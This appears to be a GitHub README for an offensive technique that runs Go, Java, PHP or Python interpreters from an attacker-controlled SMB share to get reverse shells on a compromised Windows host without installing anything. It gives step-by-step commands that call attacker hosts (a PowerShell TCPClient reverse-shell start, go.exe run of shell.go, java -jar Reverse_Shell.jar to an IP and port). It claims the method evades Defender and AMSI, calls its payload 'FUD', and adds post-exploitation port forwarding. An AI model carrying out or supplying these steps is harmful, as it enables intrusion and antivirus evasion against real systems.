# LOI Bins (Living off the Island) Binaries - A remote SMB Island in the middle of nowhere
## Abusing Remote Windows SMB Shares to Get Reverse Shells In ~~Any~~ Some Programming Languages

This repo is WIP (Work In Progress)

This is some research and techniques of ways to Execute Code in a number of different Programming Languages on a Victim Windows Host which doesnt have the environment installed.

This is nothing ground breaking, but I havent seen this technique documented anywhere. As long as you have the right environment installed on your Attacker Controlled Windows Device you can essentially run any code you wish in memory on the compromised machine. 

More will be added as and when I have the time to research it.

Programming Languages Tested With

1. [Go](#Go)
2. [Java](#example-with-java)
3. [PHP](#example-with-php)
4. Python - See here https://github.com/deeexcee-io/Eazee-As-Py

Post exploitation Techniques

1. [Python Port Forward - No SSH](#port-forward-example)
2. [Python Interpreter in Memory](#python-interpreter-example)

## Set the Scene

Lets say you have command execution on a host, your going to want to run a command to return a reverse shell. I would normally for something like `powershell -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.0.169',4444);........" `

Now with this aproach we have AMSI and Defender/AV. Running something like this without an AMSI bypass or obfuscation will get killed. Assuming our victim can reach out over SMB, typically we could either copy files over and execute them (which puts files on disk) or just execute an .exe straight from the share (which is nothing new)

This approach does the latter that but what we do is call the .exe of our programming language of choice and also pass it a script, both of which are stored on our attacker controlled SMB share. Defender still scans the scripts but by utilising **Go, Java, PHP etc** we have more flexibility to bypass static signatures. Testing with random un-obfuscated reverse shell scripts in these languages has proved successful.

You can also utilise these programming languages to carry out post exploitation in weird and wonderful ways. You could even just call python.exe from the remote share and drop straight into the [Interpreter](#python-interpreter-example) loaded from the SMB share straight into memory.

The process is extremely simple.

## <a name="Go"></a>Example with Go

1. Have a Windows Victim where you can run commands
2. Have a Windows Attack Box with your Programming Environment of choice - Python Java and Go are the only ones I have tested so far
3. Have a Kali Box or NCat on your Windows Attack Box to catch the Reverse Shell
4. Share the Folder where your Python/Java/Go.exe Application is
5. Have your Reverse Shell script also in the same folder
6. Run your command in CMD/PowerShell i.e with Go it is `\\192.168.59.130\Go\go.exe run \\192.168.59.130\Go\shell.go` where `\\192.168.59.130\Go\` is the Attacker Controlled Remote Share and `run` for `go run` and `\\192.168.59.130\Go\shell.go` is the Reverse Shell Code.

  ![image](https://user-images.githubusercontent.com/130473605/235157805-16805cb8-0019-44a7-acb2-4717a273c60a.png)


7. Sit back and execute Go on a Windows Victim Host that doesnt have it installed.

**NB - Give it time, can take a while to drop in**

![image](https://user-images.githubusercontent.com/130473605/235159127-c5551ddd-07b3-408e-baa7-ec45869b56ab.png)

**NBNB - shell.go is FUD @ 28/04/2023**

![image](https://user-images.githubusercontent.com/130473605/235163241-a43353c0-f538-4b6b-ad3e-4943631242ec.png)


## <a name="Java"></a>Example with Java

1. Download and Install JRE 
2. Share /bin folder - C:\Program Files\Java\jre-1.8\bin - I renamed my bin folder JRE when sharing in Advanced Sharing
3. Download Reverse-Shell.jar and place in /bin folder - Stolen from https://github.com/ivan-sincek/java-reverse-tcp/blob/main/jar/Reverse_Shell.jar
4. Execute java and jar file whilst bypassing Defender `\\192.168.59.130\JRE\bin\java -jar \\192.168.59.130\JRE\bin\Reverse_Shell.jar 10.201.20.61 8445`

![image](https://user-images.githubusercontent.com/130473605/235175752-b3b26e3d-5f12-4052-a124-a498cc28a8c8.png)

5. Enjoy a Java Reverse Shell from a Windows Host that doesnt have Java Installed

![image](https://user-images.githubusercontent.com/130473605/235176177-20c77e58-0a72-49e4-8036-317389f6591d.png)

## <a name="PHP"></a>Example with PHP

Same as above. Install PHP on Windows and call the php.exe application and reverse shell script.

![image](https://user-images.githubusercontent.com/130473605/235460758-c8660755-0280-4eac-a53a-4a73e0d0dfb3.png)

Catch Shell in Kali

![image](https://user-images.githubusercontent.com/130473605/235460817-62909b39-33fc-4e5c-9de9-17e057bec08a.png)


## <a name="PF"></a>Port Forward Example

## Post Exploitation

In this example you have a HTTP Server listening on localhost and want to exploit it (My Nessus Server in this case port 8834)


![image](https://user-images.githubusercontent.com/130473605/235459846-d72eb2f6-b35a-49f7-9ea4-faf5e8ef3a03.png)


Point to remote share and port forward script telling the host to listen on port 22222 and forward any traffic to 127.0.0.1:8834 (nessus)

![image](https://user-images.githubusercontent.com/130473605/235459541-ddb4806d-4ab0-41e4-8886-63ec8c2f2791.png)

This opens up an external port which you can then browse to. You can now access the Internal HTTP Server on your attacking machine. 

![image](https://user-images.githubusercontent.com/130473605/235460235-828b6079-1920-4907-a91c-6d8461a0b86d.png)

## <a name="PF"></a>Python Interpreter Example

Its as simple as pointing to a remote share which then loads python into memory. 

![image](https://user-images.githubusercontent.com/130473605/235461798-2cc3bada-d39e-48f7-82d1-d6a207d600ae.png)

![image](https://user-images.githubusercontent.com/130473605/235464000-614a31d4-8847-413f-8a21-15826483bbbf.png)

